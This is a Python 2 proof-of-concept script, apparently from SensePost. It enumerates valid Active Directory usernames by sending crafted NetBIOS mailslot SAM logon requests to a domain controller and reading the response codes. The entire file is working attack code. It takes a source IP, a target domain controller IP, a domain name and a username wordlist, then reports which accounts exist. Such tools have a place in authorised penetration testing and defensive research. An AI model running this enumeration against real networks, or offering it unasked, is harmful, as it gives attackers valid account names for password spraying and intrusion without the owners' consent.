#!/usr/bin/python2.7

#https://msdn.microsoft.com/en-us/library/cc223816.aspx

import binascii
import socket
from scapy.all import *

class SMBNetlogon_Protocol_Request_Header(Packet):
#	name = "SMBNetlogon Protocol Request Header"
	fields_desc = [StrFixedLenField("Start", b"\xffSMB", 4),
	ByteEnumField("Command", 0x25, {0x25: "Trans"}),
	ByteField("Error_Class", 0x00),
	ByteField("Reserved", 0),
	LEShortField("Error_code", 0x0000),
	ByteField("Flags", 0),
	LEShortField("Flags2", 0x0000),
	LEShortField("PIDHigh", 0x0000),
	LELongField("Signature", 0x0),
	LEShortField("Unused", 0x0),
	LEShortField("TID", 0),
	LEShortField("PID", 0),
	LEShortField("UID", 0),
	LEShortField("MID", 0),
	ByteField("WordCount", 17),
	LEShortField("TotalParamCount", 0),
	LEShortField("TotalDataCount", 0),
	LEShortField("MaxParamCount", 0),
	LEShortField("MaxDataCount", 0),
	ByteField("MaxSetupCount", 0),
	ByteField("unused2", 0),
	LEShortField("Flags3", 0),
	ByteField("TimeOut1", 0xe8),
	ByteField("TimeOut2", 0x03),
	LEShortField("unused3", 0),
	LEShortField("unused4", 0),
	LEShortField("ParamCount2", 0),
	LEShortField("ParamOffset", 0),
	LEShortField("DataCount", 0),
	LEShortField("DataOffset", 92),
	ByteField("SetupCount", 3),
	ByteField("unused5", 0)]

class StrNullUnicodeField(StrField):
	def addfield(self, pkt, s, val):
        	return s+self.i2m(pkt, val)+b"\x00\x00"


class LOGON_SAM_LOGON_REQUEST(Packet):
        fields_desc = [
        LEShortField("OpCode", 0x0012),
        LEShortField("RequestCount", 0x0000),
        StrNullUnicodeField("UnicodeComputerName", 'Domain'.encode("utf-16le")),
        StrNullUnicodeField("UnicodeUserName", 'Administrator'.encode("utf-16le")),
        StrNullField("MailslotName", '\\MAILSLOT\\NET\\GETDC042'),
        LEIntField("AccountControl", 0x00000010),
        LEIntField("DomainSIDSize", 0x00000000),
        LEIntField("NTVersion", 0x0100000b),
        LEShortField("LMNTToken", 0xffff),
        LEShortField("LM20Token", 0xffff)]

class SMBNetlogon_MailSlot_ResponseCode_Only(Packet):
	fields_desc = [
	LEIntField("ResponseCode", 0)]

bind_layers(NBTDatagram,SMBNetlogon_Protocol_Request_Header)
bind_layers(SMBNetlogon_Protocol_Request_Header,SMBMailSlot)
bind_layers(SMBMailSlot,SMBNetlogon_MailSlot_ResponseCode_Only)

print ("UserEnum NetBIOS MailSlot Ping POC - Reino Mostert/SensePost 2018")

if os.geteuid() != 0:
        print("You need to have root privileges to run this script.")
        sys.exit()

if len(sys.argv)!=5:
        print ("Note:    Use python2")
        print ("Usage:   python2 UserEnum_NBS.py SourceIP DomainControlerIP NetBIOSDomainName Userlist")
        print ("Example: python2 UserEnum_NBS.py 192.168.1.56 192.168.1.10 CONTOSO users.txt")
        sys.exit()

sourceIP=sys.argv[1]
destIP=sys.argv[2]
domainName=sys.argv[3]
filename=sys.argv[4]

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((sourceIP, 138))
s.settimeout(5.0)
client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
dstHost = (destIP, 138)

f=open(filename)
usernames=f.readlines();
f.close()
i=0

print ("[*] Starting ...")

for user in usernames:
	user=user.rstrip()
	i=i+1
	databytes=LOGON_SAM_LOGON_REQUEST(
	UnicodeComputerName=sourceIP.encode("utf-16le"),
	UnicodeUserName=user.encode("utf-16le")
	)

	databytes_len=len(databytes)
	
	mail_slot=SMBMailSlot(
	name='\\MAILSLOT\\NET\\NETLOGON',
	size=databytes_len+23 #+len('\\MAILSLOT\\NET\\NETLOGON')+1 null byte =23
	)

	mail_slot_len=len(mail_slot)
	
	netlogon_header=SMBNetlogon_Protocol_Request_Header(TotalDataCount=databytes_len,DataCount=databytes_len)
	netlogon_header_len=len(netlogon_header)
	netlogon_header.DataOffset=mail_slot_len+netlogon_header_len
	
	nbtdatagram=NBTDatagram(
	ID=i,
	Type=17,
	Flags=2,
	SourceName='WIN-UBR1GTS55QS',
	SUFFIX1='workstation',
	SUFFIX2='domain controller',
	DestinationName=domainName,
	SourcePort=138,
	SourceIP=sourceIP)
	
	# datagram length is number of bytes following packet offset
	# thus nbtdatagram+all other -14
	nbtdatagram.Length=(len(nbtdatagram)+netlogon_header_len+mail_slot_len+databytes_len) -14
	pkt=bytes(nbtdatagram/netlogon_header/mail_slot/databytes)
		
	try:
		client.sendto(pkt,dstHost)
		(data, addr) = s.recvfrom(512)
		packet=NBTDatagram(data)
		if packet[SMBNetlogon_MailSlot_ResponseCode_Only].ResponseCode == 23:
			print ("[+] " +user+" exits.")
	except socket.error as msg:
        	print ('[-] Error sending/receiving packets: '  + str(msg))
	pass

s.close()
print ("[*] Done ...")
